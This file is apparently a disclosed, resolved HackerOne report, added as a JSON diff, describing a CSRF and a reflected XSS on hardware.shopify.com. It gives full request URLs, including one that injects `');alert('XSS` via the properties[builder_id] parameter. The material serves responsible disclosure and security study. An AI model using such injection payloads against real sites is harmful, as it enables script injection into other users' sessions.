@@ -1,0 +1,113 @@
+{
+  "id": 116006,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTYwMDY=",
+  "url": "https://hackerone.com/reports/116006",
+  "title": "XSS on hardware.shopify.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-02-11T22:24:58.916Z",
+  "submitted_at": "2016-02-11T22:24:58.916Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mdv",
+    "url": "/mdv",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-03-01T06:18:34.752Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-03-01T05:30:02.003Z",
+  "team_member_agreed_on_going_public_at": "2016-03-01T06:18:34.568Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello @Shopify.\nI found CSRF and XSS, that very good combine with each other.\n### CSRF\nThis CSRF is not dangerous, but is serves me in order to perform other bugs.\nFor example, here CSRF for adding product:\n```\nhttp://hardware.shopify.com/cart/add?&id=1106494145&iPad Stand=1120276481&Cash Drawer=1120176153&Receipt Printer=1120166789&attributes[cart_exists]=true&properties[builder_id]=shapp_options_421549285_1455208671885&properties[master_builder]=1&properties[test]=test&properties[value]=11&add\n```\nWorks with GET and POST requests, which greatly simplifies the work.\n### XSS\nTo reproduce this XSS, visit this link:\n```\nhttp://hardware.shopify.com/cart/add?id=1106494145&iPad Stand=1120276481&Cash Drawer=1120176153&Receipt Printer=1120166789&attributes[cart_exists]=true&properties[builder_id]=shapp_options_421549285_1455208671885%27%29%3Balert%28%27XSS&properties[master_builder]=1&properties[test]=test&properties[value]=11&add\n```\nAnd click \"Remove\" in attached product.\nVulnerable parameter: `properties[builder_id]`\nFor this XSS i used `');alert('XSS`",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 73176,
+      "file_name": "XSS.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/073/176/5994095108600e64713e793760bf1f886f3deda2/XSS.png?response-content-disposition=attachment%3B%20filename%3D%22XSS.png%22%3B%20filename%2A%3DUTF-8%27%27XSS.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXNMYYCKA%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T130655Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIDJemFZBqtVT%2FlyYVGniWD0EfnnNqDhHks527b8KroN7Ah9tDD4RF6pInZYQr6MlXP%2FJ961QdzswXG4p%2BoV%2F%2FOMOKrIFCCsQAxoMMDEzNjE5Mjc0ODQ5Igy9FAK74pwyvoiLdVoqjwU9FgeJ7mY2d4u%2Bza0a3zmKU0eoArilQNJdW4WLuaP6b7AeUYbgONpHL59wAEWjnnSA0MEKT197lrSSQxVm8iIvzdm1WXc6FlSrEt0K4IA6G7xfSkZEz0O4kb5gyet%2BudKYNCdzjkirijFmAbeimJNb9gncfO%2Bwu4Ym2i6zTL0I0IUew2Ef4ldS3faXa8KEBUncKJEavSk%2BJamRcl63YqtJs8ShBGnsmpfBuulBduNPQzXum%2F2eFxNyseaEv39r%2BqzOucBHZhpqwkZuKF9NcXI565q9Qd3ZxkBsoaWbW8LkamLBmHA4Z7Rjp603rr9AiSb%2BbUz5keSYCM5e31kFBDnoZCjvGZ%2FIIe7b%2F9ehCyrvR50H5rtq4kpFW4SCC7pDAbrupYRVvYtmCpQuEMH9L8JKH7eqdOMo0%2B2x7yo3GV4FKRVXC1B8NxcN7qjVZMpHyyVeAo%2F%2F31a%2BI%2FmOvxNQKqxDB8UipRNR49p8n2M2yxSeE%2B9LyhK%2BcJ%2FPe5RRrAp0Bm90PXeyZ2Pmn%2B7i%2FCe3IelTA%2Fvbl9%2BdwjodF1lU4d0wP1f3a1S4xPk89yuZF%2BroOPD3ZjmV6ogbPb5fdMPSHfigStEASipF2vOIJIQ%2BKFEuM1bBBZdLfBituEPfG4xfnea6nSONavbLpP9%2FfNIbnpl8wOiyhoB9yEBAxdylDlugq%2B8TQSjq27yAKjPVnm7cYxP35I1D1eOOjNur6QD7X2%2F9XUst8llQSx4tm6Cwi4WfefyGRY4qBO9qtmQXmXJbX42v0IG22rtt%2B7cZ0QkFgXhyr3e88MbVvho0V6MqCBr32OgelKXnQVXrOV2NjAVsUtGfHBmyPENBwp5tHG0yNmRjtyT11FkgjpA%2BOtwZvXEZMPa3xMYGOrMByGKhGLbatlLxKCox2A547jxawvZa8Z1MOiWkaDRnlCBbOmL7I5ZmQcS04iACqNa3Gta63aEL0VoKPMVN%2BhkmtYjQ9jUgBJHS40jCj2gJU13GuPl3%2BuXvPgXENUWxsBEBM4zDAhKAnhgqVGX47o9%2FS31ll23hVelSvcbu2Y1qKs%2BgW7ytWkksnJwEJ8NpBPLHLg%2FJ5dntO2sgPJQdmBlpZR94m%2B1Wc3dcfyumPNuELc4wAOc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=000b7b8eebe4acc9c5ae0ceffea4ea0250fa5bd7e2e66a2509e74c0caf533e45",
+      "file_size": 463708,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-03-31T05:30:02.204Z",
+  "allow_singular_disclosure_after": -299144212.9093728,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "drsniper"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
